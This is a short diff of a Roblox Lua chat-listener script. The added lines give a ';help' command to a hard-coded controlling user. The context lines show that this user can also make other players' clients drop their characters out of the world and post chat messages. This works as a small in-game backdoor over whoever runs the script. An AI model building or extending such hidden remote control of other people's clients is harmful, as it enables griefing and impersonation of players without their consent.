@@ -40,6 +40,14 @@ Listening = TextChatService.MessageReceived:Connect(function(prompt)
  elseif cmd == ";void" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV and who == "." then
       h = game.Players.LocalPlayer.Character.HumanoidRootPart
       h.CFrame = h.CFrame - Vector3.new(0,1000,0)
+
+ elseif cmd == ";help" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV and game.Players.LocalPlayer == target then
+   local textChatService = game:GetService("TextChatService")
+   textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⭐put the username after the cmd,or put . todo all⭐")
+
+ elseif cmd == ";help" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV and who == "." then
+   local textChatService = game:GetService("TextChatService")
+   textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⭐put the username after the cmd,or put . todo all⭐")
       
    elseif cmd == ";cmds" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV and game.Players.LocalPlayer == target then
    local textChatService = game:GetService("TextChatService")
